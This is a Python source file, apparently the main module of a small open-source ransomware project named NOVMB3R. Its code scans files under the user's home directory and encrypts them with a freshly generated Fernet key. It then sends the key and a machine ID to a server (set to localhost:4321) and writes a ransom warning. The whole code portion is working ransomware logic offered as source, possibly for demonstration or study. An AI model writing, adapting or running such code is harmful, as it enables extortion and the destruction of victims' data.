#  _   _  _____     ____  __ ____ _____ ____
# | \ | |/ _ \ \   / /  \/  | __ )___ /|  _ \
# |  \| | | | \ \ / /| |\/| |  _ \ |_ \| |_) |
# | |\  | |_| |\ V / | |  | | |_) |__) |  _ <
# |_| \_|\___/  \_/  |_|  |_|____/____/|_| \_\
#
# MIT License
#
# Copyright (c) 2024 Daniel Lima
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from pathlib import Path
from cryptography.fernet import Fernet
from encrypter import parse_files
from file_scanner import IGNORE_DIRS, TARGET_FILES, get_all_files
from utils import gen_machine_id, send_key, save_warning_text

SERVER_HOST = "localhost"
PORT = 4321

KEY = Fernet.generate_key()
fernet = Fernet(KEY)
MACHINE_ID = gen_machine_id()


def run(target: Path | None = None):
    target_path = Path.home() if not target else target
    files = get_all_files(target_path, TARGET_FILES, IGNORE_DIRS)
    print(f"Found {len(files)} files")
    parse_files(fernet, files)
    send_key(f"http://{SERVER_HOST}:{PORT}", KEY, MACHINE_ID)
    save_warning_text(MACHINE_ID)


if __name__ == "__main__":
    run()
